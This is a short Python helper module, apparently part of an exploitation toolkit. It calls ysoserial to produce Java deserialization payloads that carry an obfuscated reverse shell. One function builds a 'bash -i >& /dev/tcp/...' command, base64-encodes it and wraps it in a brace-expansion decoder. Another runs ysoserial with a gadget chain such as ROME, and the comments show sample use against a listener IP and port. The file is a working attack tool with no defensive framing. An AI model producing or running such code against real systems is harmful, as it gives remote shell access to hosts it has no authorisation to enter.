# -*- coding: utf-8 -*-
import os,base64
from conf.conf import ysoserial_path

# b64_str = gen_b64_str('192.168.1.1','7777')
# payload = 'ROME'
# print(genYsoserialStr('{} {}'.format(payload,b64_str)))
# b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00'
def genYsoserialStr(cmd,ysoserial_path=ysoserial_path):
    cmd = 'java -jar {} {}'.format(ysoserial_path,cmd)
    r = os.popen(cmd)
    # print(r.buffer.read())
    return r.buffer.read()

# print(gen_b64_str('192.168.1.1','7777'))
# "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"
def gen_b64_str(listen_ip,listen_port):
    shell_payload = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(listen_ip, listen_port)
    shell_payload_b64str = base64.b64encode(shell_payload.encode()).decode()
    return '"bash -c {echo,'+shell_payload_b64str+'}|{base64,-d}|{bash,-i}"'

# b64_str = gen_b64_str('192.168.1.1','7777')
# payload = 'ROME'
# print(genYsoserialStr('{} {}'.format(payload,b64_str)))